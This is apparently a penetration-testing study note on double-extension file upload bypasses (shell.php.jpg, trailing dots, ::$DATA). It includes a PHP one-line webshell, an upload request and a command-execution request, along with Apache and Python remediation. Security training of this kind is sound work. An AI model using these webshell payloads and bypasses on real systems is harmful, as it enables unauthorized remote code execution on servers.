---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.05 Double Extension (file.php.jpg)"
---

# 22.05 — Double Extension (file.php.jpg)

## What is it?
When applications accept file uploads, they typically check the file extension to ensure it is safe (e.g., verifying it ends in `.jpg`). However, an attacker can supply a filename with multiple extensions, such as `shell.php.jpg`. 

The vulnerability arises when the web application validation logic and the web server execution logic disagree on how to parse extensions. The application might look at the *last* extension (`.jpg`), declare it safe, and save it. Meanwhile, older or misconfigured web servers (like Apache configured with `AddHandler`) might look at the filename, see the `.php` extension anywhere in the string, and decide to execute it as a PHP script regardless of the trailing `.jpg`.

Additionally, Windows environments have specific quirks. Uploading `shell.php.` (with a trailing dot) or `shell.php ` (with a trailing space) might bypass a blacklist looking strictly for `.php`. When Windows saves the file, it automatically strips the trailing dot or space, resulting in an executable `shell.php`.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Uploads file: "shell.php.jpg"
   ▼
[Web Application Validator]
   │
   │ 2. Extracts last extension: ".jpg"
   │ 3. Is ".jpg" allowed? YES
   ▼
[File System] ─── 4. Saves as: /var/www/html/uploads/shell.php.jpg
   │
[Attacker] ────── 5. Requests: GET /uploads/shell.php.jpg
   │
[Apache Web Server (Misconfigured)]
   │
   │ 6. Parses filename: "shell.php.jpg"
   │ 7. Contains ".php"? YES! -> Hand off to PHP interpreter!
   ▼
[PHP Interpreter executes shell.php.jpg]
```

## How to Find It
- **Manual steps:**
  1. Intercept a file upload request using Burp Suite.
  2. Change the filename to include a double extension (e.g., `test.php.jpg`).
  3. Ensure the file content actually contains a simple script (e.g., `<?php echo "VULNERABLE"; ?>`).
  4. Submit the upload.
  5. Navigate to the uploaded file's URL. If the browser displays the word "VULNERABLE" instead of a broken image icon, the file was executed as code.
  6. On Windows targets, try appending dots or spaces (`test.php.` or `test.php `).

- **Tool commands with flags explained:**
  To quickly generate a list of permutations for fuzzing with Intruder or ffuf:
  ```bash
  cat << 'EOF' > double_exts.txt
  shell.php.jpg
  shell.php.png
  shell.jpg.php
  shell.php.
  shell.php_
  shell.php%20
  shell.php::$DATA
  EOF
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Identify an upload endpoint that permits image uploads (`.jpg`, `.png`, etc.).
  2. Create a PHP webshell payload.
  3. Modify the filename in the HTTP POST request to `shell.php.jpg`.
  4. Send the request. If successful, locate the path to the uploaded file.
  5. Access the file via the browser or `curl`. If Apache is misconfigured to execute any file containing `.php`, your shell will run.

- **Actual payloads:**
  **Standard Double Extension:**
  ```text
  filename="shell.php.jpg"
  ```
  **Windows Trailing Dot/Space Bypass:**
  ```text
  filename="shell.php."
  filename="shell.php "
  ```
  **Windows Alternate Data Stream (ADS):**
  ```text
  filename="shell.php::$DATA"
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="image"; filename="shell.php.jpg"
  Content-Type: image/jpeg

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  **Execution Request:**
  ```http
  GET /uploads/shell.php.jpg?cmd=whoami HTTP/1.1
  Host: target.com

  HTTP/1.1 200 OK
  
  www-data
  ```

## Real-World Example
In a known penetration test, a file upload portal strictly validated that files must end in `.pdf` or `.jpg`. The tester uploaded a file named `report.php.pdf`. The application saved the file. However, the application was hosted on an Apache server that had a legacy configuration line: `AddHandler application/x-httpd-php .php`. This directive tells Apache to parse *any* file containing `.php` in its name. When the tester navigated to `report.php.pdf`, Apache executed the embedded PHP code, leading to an immediate remote shell.

## How to Fix It
- **Developer remediation:**
  Do not use `AddHandler` in Apache configurations; use `AddType` instead, or better yet, explicitly define `<FilesMatch>` directives that anchor the extension to the end of the string (`\.php$`). On the application side, strictly extract the true, final extension. The absolute best defense is to completely discard the user-supplied filename and generate a secure UUID for the file upon saving.

- **Code snippet:**
  **Apache Configuration Fix:**
  ```apache
  # BAD - Matches shell.php.jpg
  AddHandler application/x-httpd-php .php
  
  # GOOD - Only matches files ending exactly in .php
  <FilesMatch "\.php$">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```
  
  **Python (Secure Filename Generation):**
  ```python
  import uuid
  from pathlib import Path

  def secure_upload(filename):
      # Extract only the last extension
      ext = Path(filename).suffix.lower()
      
      if ext not in ['.jpg', '.png']:
          raise ValueError("Invalid extension")
          
      # Discard the original name (shell.php.jpg) and generate a new one
      safe_filename = f"{uuid.uuid4()}{ext}"
      return safe_filename
  ```

## Chaining Opportunities
- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → Some applications check both the extension and the file's magic bytes. Combine `shell.php.jpg` with valid JPEG magic bytes (`FF D8 FF E0`) to bypass both checks simultaneously.
- This vuln + [[06 - Null Byte Injection (file.php%00.jpg)]] → If `shell.php.jpg` does not execute because the server only executes files ending *exactly* in `.php`, try `shell.php%00.jpg` to truncate the trailing `.jpg` at the OS level.

## Related Notes
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[06 - Null Byte Injection (file.php%00.jpg)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
